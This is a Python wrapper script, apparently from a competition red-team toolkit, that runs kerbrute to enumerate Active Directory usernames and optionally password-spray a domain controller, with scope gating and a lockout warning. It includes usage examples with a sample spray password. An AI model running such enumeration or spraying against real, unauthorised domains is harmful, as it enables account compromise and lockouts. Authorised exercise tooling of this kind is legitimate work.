#!/usr/bin/env python3
"""
red/kerbrute_scan.py

Wraps kerbrute for Kerberos pre-auth username enumeration, and optionally
password spraying, against an in-scope AD domain controller (thehouse).
Gated the same way as the other red/ wrappers.

Username enumeration is low-risk (no bad password attempts logged for
valid accounts under default Kerberos behavior). Password spraying is
NOT low-risk — it can lock out accounts depending on the domain's lockout
policy, which hurts your own scored uptime if it's a shared/scored
account. Read the warning this script prints before using --spray.

Requires kerbrute (https://github.com/ropnop/kerbrute) on the Kali box,
and a username wordlist (SecLists has common AD username lists).

Usage — enumerate usernames (preview):
    python3 red/kerbrute_scan.py --scope config/local/scope.json \\
        --target 172.16.XX.50 --domain misty.view --userlist users.txt

Usage — enumerate usernames (actually run):
    python3 red/kerbrute_scan.py --scope config/local/scope.json \\
        --target 172.16.XX.50 --domain misty.view --userlist users.txt \\
        --run --grace-ended --provided-kali

Usage — password spray (requires --spray AND --password explicitly):
    python3 red/kerbrute_scan.py --scope config/local/scope.json \\
        --target 172.16.XX.50 --domain misty.view --userlist valid_users.txt \\
        --spray --password 'Summer2026!' \\
        --run --grace-ended --provided-kali
"""

import argparse
import shlex
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, "red")
from scope_gate import add_common_args, require_authorized_target  # noqa: E402


def build_command(mode: str, target: str, domain: str, userlist: str, password: str, threads: int) -> list:
    base = ["kerbrute", mode, "-d", domain, "--dc", target, "-t", str(threads)]
    if mode == "userenum":
        return base + [userlist]
    if mode == "passwordspray":
        return base + [userlist, password]
    raise ValueError(f"Unknown mode: {mode}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Gated kerbrute wrapper for an in-scope AD domain controller.")
    add_common_args(parser)
    parser.add_argument("--domain", required=True, help="AD domain name, e.g. misty.view")
    parser.add_argument("--userlist", required=True, help="Path to username wordlist")
    parser.add_argument("--spray", action="store_true", help="Password-spray instead of enumerate. Reads the risk warning below.")
    parser.add_argument("--password", default="", help="Single password to spray (required with --spray)")
    parser.add_argument("--threads", type=int, default=10, help="kerbrute thread count (default 10, keep conservative for spraying)")
    args = parser.parse_args()

    target = require_authorized_target(args)

    if not Path(args.userlist).is_file():
        sys.exit(f"[BLOCKED] userlist not found: {args.userlist}")

    if args.spray:
        if not args.password:
            sys.exit("[BLOCKED] --spray requires --password to be set explicitly.")
        print(
            "[WARNING] Password spraying can trigger account lockouts depending on the domain's "
            "lockout policy. If any sprayed account is also a scored service account, a lockout "
            "will tank your own uptime score. Only spray against accounts you've confirmed are not "
            "scored, and keep --threads low.\n"
        )
        mode = "passwordspray"
    else:
        mode = "userenum"

    cmd = build_command(mode, target, args.domain, args.userlist, args.password, args.threads)
    print("Command:", " ".join(shlex.quote(c) for c in cmd))

    if not args.run:
        return 0

    try:
        subprocess.run(cmd, check=True)
    except FileNotFoundError:
        sys.exit("[ERROR] kerbrute not found on this machine. Install it on the provided Kali box first.")
    except subprocess.CalledProcessError as e:
        sys.exit(f"[ERROR] kerbrute exited with status {e.returncode}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
